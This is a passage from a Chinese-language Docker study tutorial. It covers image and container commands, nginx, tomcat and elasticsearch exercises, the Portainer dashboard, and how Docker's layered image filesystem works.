<li><code>CREATED</code>：镜像的创建时间（不是在宿主机上的创建时间）；</li>
<li><code>SIZE</code>：镜像的大小；</li>
</ol>
<h3 id="搜索镜像">4.2.2. 搜索镜像</h3>
<p>命令：<code>docker search</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331160620.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>介绍一个 search 的进阶使用，就是过滤条件
<code>-f condition</code>，比如需要 STARS 300 以上的信息，就可以使用
<code>docker search mysql -f stars=3000</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331160919.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="拉取镜像">4.2.3. 拉取镜像</h3>
<p>命令：<code>docker pull</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331161124.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>尝试运行：<code>docker pull mysql</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ docker pull mysql </span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete </span><br><span class="line">93619dbc5b36: Pull complete </span><br><span class="line">99da31dd6142: Pull complete </span><br><span class="line">626033c43d70: Pull complete </span><br><span class="line">37d5d7efb64e: Pull complete </span><br><span class="line">ac563158d721: Pull complete </span><br><span class="line">d2ba16033dad: Pull complete </span><br><span class="line">688ba7d5c01a: Pull complete </span><br><span class="line">00e060b6d11d: Pull complete </span><br><span class="line">1c04857f594f: Pull complete </span><br><span class="line">4d7cfa90e6ea: Pull complete </span><br><span class="line">e0431212d27d: Pull complete </span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> mysql:latest</span><br><span class="line">docker.io/library/mysql:latest</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ol type="1">
<li>Digest：数字签名；</li>
<li><code>docker.io/library/mysql:latest</code>：真实地址，上述命令等价于
<code>docker pull docker.io/library/mysql:latest</code>；</li>
<li>使用的是分层下载（后面会说到）</li>
</ol>
<p>指定版本下载，比如 <code>docker pull mysql:5.7</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists </span><br><span class="line">93619dbc5b36: Already exists </span><br><span class="line">99da31dd6142: Already exists </span><br><span class="line">626033c43d70: Already exists </span><br><span class="line">37d5d7efb64e: Already exists </span><br><span class="line">ac563158d721: Already exists </span><br><span class="line">d2ba16033dad: Already exists </span><br><span class="line">0ceb82207cd7: Pull complete </span><br><span class="line">37f2405cae96: Pull complete </span><br><span class="line">e2482e017e53: Pull complete </span><br><span class="line">70deed891d42: Pull complete </span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br></pre></td></tr></table></figure>
<p>注意前几个的 <code>Already exists</code>，这是前一步下载 mysql
时下载的，这就是 <strong>联合文件系统</strong>（后面补充）
的好处，不同镜像如果存在相同文件可以复用。 ^f67cbf</p>
<h3 id="删除镜像">4.2.4. 删除镜像</h3>
<p>命令：<code>docker rmi</code>，i 就是 image 的意思；</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331162009.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331162241.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<ul>
<li>删除单个镜像：<code>docker rmi 镜像id</code>，</li>
<li>删除多个镜像：<code>docker rmi id1 id2 id3 ....</code></li>
<li>删除全部镜像：<code>docker rmi $(docker images -aq)</code>，后面的
<code>$(docker images -aq)</code> 获取所有镜像的 id，然后给前面的
<code>docker rmi</code>，所以就全部删除了。</li>
</ul>
<blockquote>
<p>注意：加了
<code>-f</code>，即使当前镜像正在被使用（容器）也会直接删除。</p>
</blockquote>
<h2 id="容器命令">4.3. 容器命令</h2>
<blockquote>
<p>有了镜像，才可以创建容器。</p>
</blockquote>
<h3 id="新建容器并启动">4.3.1. 新建容器并启动</h3>
<p>命令：<code>docker run</code></p>
<p><code>docker run --help</code>
内容过多，这里不展示了。常用参数说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. --name=&quot;Name&quot;：容器名字，比如tomcat1、tomcat2，用来区分容器；</span><br><span class="line">2. -d：后台方式运行</span><br><span class="line">3. -it：使用交互方式运行，可以进入容器查看内容</span><br><span class="line">4. -p：指定容器的端口（与主机端口实现映射），Publish a container&#x27;s port(s) to the host</span><br><span class="line">	1. -p ip:主机端口:容器端口</span><br><span class="line">	2. -p 主机端口:容器端口 （常用）</span><br><span class="line">	3. -p 容器端口</span><br><span class="line">	4. 容器端口</span><br><span class="line">5. -P：指定随机端口，Publish all exposed ports to random ports</span><br></pre></td></tr></table></figure>
<p>测试：<code>docker run -it centos</code>，此时已经进入到容器内，如果需要退出，可以使用
<code>exit</code> 退出。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331163820.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<blockquote>
<p>这里是容器停止并退出，详细可以查看 [[#4.3.3. 退出容器]]</p>
</blockquote>
<h3 id="列出所有运行的容器">4.3.2. 列出所有运行的容器</h3>
<p>命令：<code>docker ps</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331164000.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>常用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. -a：列出所有运行 + 历史运行过的容器；</span><br><span class="line">2. -n=num：列出最近创建的 num 个容器；</span><br><span class="line">3. -q：只显示容器的id；</span><br></pre></td></tr></table></figure>
<h3 id="退出容器">4.3.3. 退出容器</h3>
<p>退出容器有两种方式：</p>
<ol type="1">
<li>直接输入 <code>exit</code>，退出容器并停止容器；</li>
<li><code>ctrl + p、ctrl + q</code>，退出容器，容器不停止，进入后台；</li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331164627.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>上图成功退出，但容器正在运行。</p>
<h3 id="删除容器">4.3.4. 删除容器</h3>
<p>命令：<code>docker rm</code></p>
<p>使用方式：</p>
<ol type="1">
<li>删除单个指定容器：<code>docker rm 容器id</code></li>
<li>删除多个指定容器：<code>docker rm id1 id2 ...</code></li>
<li>递归删除所有容器：<code>docker rm $(docker ps -aq)</code></li>
<li><code>docker ps -aq | xargs docekr rm</code>，同上</li>
</ol>
<blockquote>
<p>注意：加了 <code>-f</code>，正在运行的容器也会直接删除。</p>
</blockquote>
<h3 id="启动和停止容器">4.3.5. 启动和停止容器</h3>
<p>操作：</p>
<ol type="1">
<li>启动：<code>docker start 容器id1 容器id2 ...</code></li>
<li>重启：<code>docker restart 容器id1 容器id2 ...</code></li>
<li>停止当前正在运行的容器：<code>docker stop 容器id1 容器id2 ...</code></li>
<li>强制停止当前正在运行的容器：<code>docker kill 容器id1 容器id2 ...</code></li>
</ol>
<h2 id="常用其他命令">4.4. 常用其他命令</h2>
<h3 id="后台启动容器">4.4.1. 后台启动容器</h3>
<p>命令：<code>docker run -d 镜像名</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331200909.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>发现问题没有？后台启动了 centos 镜像，但使用 <code>docker ps</code>
发现没有正在运行的容器。</p>
<ul>
<li>这是因为 docker 容器使用<strong>后台运行
(-d)</strong>，必须有一个前台进程。简单来说就是这个 docker
容器必须有一个应用在运行，在提供服务，如果 docker
发现有容器没有应用正在执行，就会自动停止该容器。</li>
</ul>
<h3 id="查看日志命令">4.4.2. 查看日志命令</h3>
<p>命令：<code>docker logs</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331201153.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<blockquote>
<p>注意，需要保证当前容器正在运行</p>
</blockquote>
<p>我们先启用一个容器，然后输入命令 <code>docker logs id</code>
来查看：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331202925.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>会发现当前容器没有日志信息，这是因为容器只是开着，并没有执行任务，所以也不会有日志。</p>
<p>我们写一个 shell 脚本，让容器干点活。这里结合者 [[#4.4.1.
后台启动容器]]中的问题一起说明，使用后台运行容器，同时让其干活，就能够保证容器不被杀死。命令如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d centos /bin/bash -c <span class="string">&quot;while true;do echo &#x27;hello world&#x27;;done&quot;</span></span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331203307.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>此时，后台运行的进程没有被杀死，我们查看日志，因为这里是一个无限循环，所以一旦查看日志就会刷屏，所以我们使用
<code>-n</code> 查看几条：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331203441.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这里解释一下 3 个参数的作用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. -n num：查看最新的 num 条日志记录；</span><br><span class="line">2. -f：实时追踪日志记录，有新的就立马显示；</span><br><span class="line">3. -t：显示时间戳，也就是 hello world 前面的时间</span><br></pre></td></tr></table></figure>
<h3 id="查看容器中的进程信息">4.4.3. 查看容器中的进程信息</h3>
<p>命令：<code>docker top</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331201951.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331203647.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>内容与 Linux 上使用 <code>ps</code> 命令差不多。</p>
<h3 id="查看镜像的元数据">4.4.4. 查看镜像的元数据</h3>
<p>命令：<code>docker inspect</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331202109.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>其实就是查看容器的一些信息，比如环境变量、网络配置、容器 id
等等基础信息</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331203935.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>上图中的 Id 就是容器 Id，可以发现我们命令中使用的容器 ID 是真实 ID
的子串。</p>
<h3 id="进入当前正在运行的容器">4.4.5. 进入当前正在运行的容器</h3>
<p>命令：</p>
<ol type="1">
<li><code>docker exec -it 容器id bashShell</code>；</li>
<li><code>docker attach 容器id</code></li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331204207.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331204312.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>第一种方法的演示</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331204748.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>跟启动容器类似，也要使用 <code>-it</code>
来进入，进入之后，可以在终端执行程序，可以看到后台正在执行命令，也就是刚刚写的无限循环的命令。</p>
<p>第二种方法演示，没法截图，如果进入的是同一个容器，恭喜你被我坑了，因为刚刚写了个无限循环，所以已进入就被刷屏了。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331204949.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>没法使用
<code>ctrl + c</code>，也没法退出容器，只能关闭主机当前终端重开一个，使用命令强制关闭容器
<code>docker kill id</code>。</p>
<p>两者的区别：</p>
<ol type="1">
<li><code>docker exec</code>：进入容器后开启一个新的终端；</li>
<li><code>docker attach</code>：进入容器正在执行的终端；</li>
</ol>
<h3 id="拷贝命令">4.4.6. 拷贝命令</h3>
<p>命令：</p>
<ol type="1">
<li>容器拷贝到主机：
<code>docker cp 容器id:容器内源路径 主机目的路径</code></li>
<li>主机拷贝到容器：
<code>docker cp 主机源路径 容器id:容器内目的路径</code></li>
</ol>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331205713.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>在容器内创建一个文件 <code>/home/container2Physical.txt</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331211520.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>在物理机创建一个文件 <code>/home/kali/phy2Container.txt</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331211627.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>将物理机的文件拷贝到容器内：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ docker cp phy2Container.txt f25282d9e514:/home</span><br><span class="line">Successfully copied 2.048kB to f25282d9e514:/home</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331211855.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>J将容器内文件拷贝到物理机：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ docker cp f25282d9e514:/home/container2Physical.txt /home/kali</span><br><span class="line">Successfully copied 2.048kB to /home/kali</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331212013.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h4 id="问题">4.4.6.1. 问题</h4>
<p>这里演示一个奇怪的场景，我们先将物理机的这两个文件删除，然后关闭容器。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331212133.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>问题：容器停止了，为什么容器 id 还能用？</p>
<ul>
<li>个人理解：容器停止了，其实类比于电脑关机，但是由于容器试运行在宿主机上，所以容器的文件也存在与宿主机的某个地方，所以即使容器关闭，宿主机还是能够通过容器
id 找到容器所在目录。</li>
</ul>
<p>我的理解应该是正确的，容器停止后，可以使用
<code>docker start 容器id</code> 来重新启动，并且里面内容保持不变。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331213327.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>当容器删除后，内容才真正不可用。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331213449.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h2 id="小结">4.5. 小结</h2>
<p>[[docker入门_小结.png]]</p>
<h2 id="作业练习">4.6. 作业练习</h2>
<h3 id="安装-nginx">4.6.1. 安装 nginx</h3>
<p>第一步，搜索镜像 <code>docker search nginx</code>，可以去 docker hub
搜索，有详细信息。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331223143.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>第二步，拉取镜像 <code>docker pull nginx</code>。</p>
<p>第三步，启动 nginx 容器，将容器的 80 端口（nginx
默认端口）映射到主机的 3333
端口，<code>docker run -d --name nginx01 -p 3344:80 nginx</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331223502.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>解释：</p>
<ul>
<li><code>-p nginx01</code>：给容器起一个别名
<code>nginx01</code>；</li>
<li><code>-p 3344:80</code>：将容器的 80 端口映射到宿主机的 3344
端口；</li>
</ul>
<p>第四步，通过宿主机的 3344 端口，尝试访问容器的
nginx，<code>curl localhost:3344</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331223741.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这样，只要能够访问宿主机，就能够通过宿主机的 3344
端口访问到容器。</p>
<h4 id="思考">4.6.1.1. 思考</h4>
<p>成功在 docker 部署 nginx，非常的简单，但有一个点，如果需要修改 nginx
配置，则每次都需要进入容器修改，这样又很麻烦，怎么解决呢？</p>
<p>可以使用 <strong>数据卷</strong>
技术：容器外部（宿主机）提供一个映射路径，达到只要在宿主机修改文件，容器内部就可以自动修改。后面会说明。</p>
<h3 id="安装-tomcat">4.6.2. 安装 tomcat</h3>
<blockquote>
<p>常规的步骤看 [[#4.6.1. 安装 nginx]]，这里介绍新的</p>
</blockquote>
<p>使用官方的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it --rm tomcat:9.0</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331224940.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>此时 tomcat 已经运行了，如果将其停止 <code>ctrl+c</code>，查找一下
tomcat 的容器，会发现没有了
<code>docker ps -a</code>，甚至镜像都给你删了。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331225036.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>解释：</p>
<ul>
<li><code>-rm</code>
的作用就是镜像运行，只要停止就直接删除容器，但会保存镜像，卸磨杀驴；</li>
</ul>
<hr />
<p>运行镜像
<code>docker run -d --name tomcat01 -p 3355:8080 tomcat:9.0</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331225650.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>会发现显示 404，这是什么问题呢？进入容器内，查看 webapps
目录，发现是空的，但存在一个 <code>webapps.disk</code> 目录，将
<code>webapps.disk</code> 的内容全部复制到 <code>webapps</code>
下就可以访问了。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331225918.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230331225928.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h4 id="思考-1">4.6.2.1. 思考</h4>
<p>以后部署项目，每次都要进入容器内将 <code>webapps.disk</code>
的内容复制到 <code>webapps</code>
目录，非常的麻烦，有什么办法能够解决呢？</p>
<p>可以使用 <strong>数据卷</strong>
技术：容器外部（宿主机）提供一个映射路径，达到只要在宿主机修改文件，容器内部就可以自动修改。后面会说明。</p>
<h3 id="部署-eskibana">4.6.3. 部署 es+kibana</h3>
<blockquote>
<p>不太了解 es 和 kibana</p>
</blockquote>
<p>可以去官网看一下如何使用 es：<a
href="https://hub.docker.com/_/elasticsearch">Docker</a>，直接输入如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name elasticsearch --net somenetwork -p 9200:9200 -p 9300:9300 -e <span class="string">&quot;discovery.type=single-node&quot;</span> elasticsearch:7.6.2</span><br></pre></td></tr></table></figure>
<p>会发现报错：<code>docker: Error response from daemon: network somenetwork not found.</code>，这是因为
<code>--net</code>
后面跟着网络配置，这里还没说到，所以将这个参数去掉：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e <span class="string">&quot;discovery.type=single-node&quot;</span> elasticsearch:7.6.2</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401102825.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>成功启动 es 容器。查看当前容器占用内存的情况，命令
<code>docker stat</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401102931.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>发现占内存
<code>1.2G</code>，我是因为在虚拟机上，所以内存比较多，如果使用的阿里云服务器
1 核 2 G
的此时可能就卡死了，因此，可以通过下面命令通过限制内存使用来启动
es：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e <span class="string">&quot;discovery.type=single-node&quot;</span> -e ES_JAVA_OPTS=<span class="string">&quot;-Xms64m -Xmx512m&quot;</span> elasticsearch:7.6.2</span><br></pre></td></tr></table></figure>
<blockquote>
<p>需要取其他的名字，或者将之前的容器删了。</p>
</blockquote>
<p>此时再次查看内存占用情况：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401103344.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>发现占用小了。</p>
<h4 id="思考-2">4.6.3.1. 思考</h4>
<p>如何使用 kibana 连接
elasticsearch？两者都是容器，而容器之间隔离不能够直接连接，所以只能够通过宿主机</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401103812.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这里面涉及到一些技术，比如宿主机如何将 kibana 连接到
elasticsearch，后面会说到。</p>
<h2 id="可视化">4.7. 可视化</h2>
<p>可视化面板有两个：</p>
<ol type="1">
<li>Portainer（现在用）</li>
<li>Rancher（CI/CD 再用）</li>
</ol>
<p>Portainer 是 Docker
图形化界面管理工具！提供一个后台面板供我们操作！启动命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8080:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=<span class="literal">true</span> portainer/portainer</span><br></pre></td></tr></table></figure>
<p>然后访问 <code>localhost:8080</code>，看到如下界面就算成功：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401104441.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这是创建默认用户，创建完成之后会让你选择，选择
local，之后就能见到这个界面：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401104641.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这里就能看到当前服务器有多少容器、镜像、容器网络使用情况等信息，可以在右边的导航行看到，这里显示一下服务器有多少正在运行的容器：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401104802.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<blockquote>
<p>需要注意，平时一般不用可视化面板，直接命令行即可。</p>
</blockquote>
<h1 id="镜像讲解">5. 镜像讲解</h1>
<p>镜像是一种轻量级, 可执行的独立软件包,
用来打包软件运行环境和基于运行环境开发的软件,
它包含运行某个软件所需的所有内容, 包括代码、运行时的库,
环境变量和配置文件。</p>
<p>所有的应用直接打包 docker 镜像，就可以直接跑起来！如何得到镜像:</p>
<ol type="1">
<li>从远程仓库下载</li>
<li>朋友拷贝</li>
<li>自己制作 DockerFile</li>
</ol>
<h2 id="分层与镜像加载">5.1. 分层与镜像加载</h2>
<h3 id="概述-1">5.1.1. 概述</h3>
<p>基础：[[#3.6. 联合文件系统]]</p>
<p>镜像是基于联合文件系统的。这里顺带介绍一下 linux
的文件系统相关内容：</p>
<ul>
<li>bootfs (boot file system)主要包含 bootloader 和 kernel, bootloader
主要引导加载 kernel, Linux 刚启动时会加载 bootfs 文件系统，在 Docker
镜像的最底层是 bootfs。这一层与我们典型的 Linux/Unix 系统是一样的，包含
boot 加载器和内核。当 boot
加载完成之后整个内核就都在内存中了，此时内存的使用权已由 bootfs
转交给内核，此时系统也会卸载 bootfs；</li>
<li>rootfs (root file system) ，在 bootfs 之上。包含的就是典型 Linux
系统中的 /dev, /proc, /bin, /etc 等标准目录和文件。rootfs
就是各种不同的操作系统发行版，比如 Ubuntu，Centos 等；</li>
<li>所有的镜像（基于 Linux 的）都是运行在上述两层之上，下图中的 debian
就是 rootfs；</li>
</ul>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401113947.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>Docker 镜像为什么采取分层的结构呢？</p>
<ul>
<li>最大的好处就是资源共享，如果多个镜像都是基于相同的 base
镜像，那么宿主机只需要下载一次 base
镜像，同时这几个镜像启动时，宿主机内存也只需要加载一次 base
镜像，就可以为所有的容器服务器；</li>
</ul>
<p>可以使用 <code>docker image inspect</code> 命令查看镜像分层情况，字段
<code>RootFS</code> 内的 <code>Layers</code>：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401114347.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这就是 <code>redis</code> 镜像所有的分层。</p>
<h3 id="实现的具体分析">5.1.2. 实现的具体分析</h3>
<p>所有的 Docker
镜像都起始于一个基础镜像层，当进行修改或增加新的内容时，就会在当前镜像层之上，创建新的镜像层。</p>
<p>举一个简单的例子，假如基于 Ubuntu Linux 16.04
创建一个新的镜像，这就是新镜像的第一层；如果在该镜像中添加 Python
包，就会在基础镜像层之上创建第二个镜像层；如果继续添加一个安全补丁，就会创建第三个镜像层。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401114450.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>在添加额外的镜像层的同时，镜像始终保持是当前所有镜像的组合，理解这一点非常重要。下图中举了一个简单的例子，每个镜像层包含
3 个文件，而镜像包含了来自两个镜像层的 6 个文件。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401114519.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>上图中的镜像层跟之前图中的略有区别，主要目的是便于展示文件。下图中展示了一个稍微复杂的三层镜像，在外部看来整个镜像只有
6 个文件，这是因为最上层中的文件 7 是文件 5 的一个更新版本。</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401114601.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这种情况下，上层镜像层中的文件覆盖了底层镜像层中的文件。这样就使得文件的更新版本作为一个新镜像层添加到镜像当中。</p>
<ul>
<li>Docker
通过存储引擎（新版本采用快照机制）的方式来实现镜像层堆栈，并保证多镜像层对外展示为统一的文件系统。<br />
</li>
<li>Linux 上可用的存储引擎有 AUFS、Overlay2、Device Mapper、Btrfs 以及
ZFS。顾名思义，每种存储引擎都基于 Linux
中对应的文件系统或者块设备技术，并且每种存储引擎都有其独有的性能特点。<br />
</li>
<li>Docker 在 Windows 上仅支持 windowsfilter 一种存储引擎，该引擎基于
NTFS 文件系统之上实现了分层和 CoW。</li>
</ul>
<p>最后，上图中 3 个镜像层的镜像对外提供的视角如下图：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401114732.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>从外往内看，用户看到的是一个完整的镜像。但拉取该镜像时，会一层一层拉取，先拉取第一层的文件
1、2、3，然后拉取第二层的 4、6，最后拉取第三层的
7，如果其中某一层的所有文件都已经存在宿主机内，则会显示
<code>Already exists</code>。</p>
<h3 id="分层的特点">5.1.3. 分层的特点</h3>
<p><strong>Docker
镜像时只读的，当容器启动时，一个新的可写层被加载到镜像的顶部。</strong></p>
<p>一个镜像使用 <code>docker run</code> 之后如下图：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230401115334.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>容器中分为两个部分：</p>
<ol type="1">
<li>下面蓝色部分和镜像是一样的，称为镜像层，<strong>只读</strong>；</li>
